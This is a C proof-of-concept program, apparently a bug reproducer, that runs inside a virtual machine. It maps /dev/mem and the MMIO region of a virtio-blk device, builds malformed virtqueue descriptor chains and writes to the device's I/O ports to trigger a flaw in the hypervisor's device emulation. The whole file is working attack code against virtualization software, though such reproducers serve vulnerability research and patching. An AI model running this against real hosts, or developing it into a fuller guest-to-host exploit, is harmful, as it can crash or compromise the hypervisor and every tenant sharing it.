#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_writel(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

void mmio_writew(uint32_t addr, uint16_t value) {
    *((uint16_t *)(mmio_mem + addr)) = value;
}

void mmio_writeb(uint32_t addr, uint8_t value) {
    *((uint8_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256,
            PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

typedef struct VRingDesc {
    uint64_t addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next;
} VRingDesc;

typedef struct VRingAvail {
    uint16_t flags;
    uint16_t idx;
    uint16_t ring[0x100];
} VRingAvail;

typedef struct VRingUsedElem {
    uint32_t id;
    uint32_t len;
} VRingUsedElem;

typedef struct VRingUsed {
    uint16_t flags;
    uint16_t idx;
    VRingUsedElem ring[0x100];
} VRingUsed;

typedef struct VRing {
    VRingDesc desc[0x100];
    VRingAvail avai;
    VRingUsed used;
} VRing;

#define VIRTIO_CONFIG_S_ACKNOWLEDGE	1
#define VIRTIO_CONFIG_S_DRIVER		2
#define VIRTIO_CONFIG_S_DRIVER_OK	4
#define VIRTIO_CONFIG_S_FEATURES_OK	8
#define VIRTIO_CONFIG_S_NEEDS_RESET	0x40
#define VIRTIO_CONFIG_S_FAILED		0x80

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce virtio-blk-01: start\n[+]\n");

    // lspci -v
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource4", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    iopl(3);

    // GDB
    // b virtio_ioport_write

    // first vring
    // memset(devmem_mem + 0x1000, 0, 0x4000);
    VRing *vring0 = (VRing *)(devmem_mem + 0x1000);
    for (int i = 0; i < 0x100; i++)
        vring0->desc[i].len = 0x100;
    vring0->avai.idx = 0x0c8e;

    // second vring
    VRing *vring1 = (VRing *)(devmem_mem + 0x3000);
    vring1->desc[0x24].addr = 0x124000;
    vring1->desc[0x24].len = 0x20;
    vring1->desc[0x24].flags = 0xe611;
    vring1->desc[0x24].next = 0x93;
    vring1->desc[0x93].addr = 0;
    vring1->desc[0x93].len = 0x210;
    vring1->desc[0x93].flags = 0x54c3;
    vring1->desc[0x93].next = 0xda;
    vring1->desc[0xda].addr = 0;
    vring1->desc[0xda].len = 0x201;
    vring1->desc[0xda].flags = 0x2346;
    vring1->desc[0xda].next = 0x0;
    vring1->avai.ring[0x83] = 0x24;
    vring1->avai.ring[0xd4] = 0x24;

    outl(0, 0xc008); // reset
    outl(1, 0xc008);
    mmio_writeb(0x3003, 0x69);
    sleep(1);
    outl(3, 0xc008);
    mmio_writeb(0x3003, 0x69);
 
    printf("[+]\n[+] Reproduce virtio-blk-01: fail\n[+]\n");

    return 0;
}
